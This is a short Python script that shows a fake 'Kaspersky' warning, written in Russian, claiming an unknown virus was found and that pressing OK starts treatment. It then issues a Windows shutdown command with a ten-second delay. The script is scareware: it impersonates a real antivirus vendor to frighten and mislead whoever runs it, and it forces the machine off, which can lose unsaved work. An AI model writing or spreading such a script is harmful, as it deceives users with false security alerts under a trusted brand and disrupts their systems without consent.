import os
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()
root.withdraw()

root.title("Kaspersky")
messagebox.showwarning("Kaspersky", "Обнаружен неизвестный вирус, нажмите ок для начала лечения")
root.mainloop()

os.system("shutdown /s /t 10")
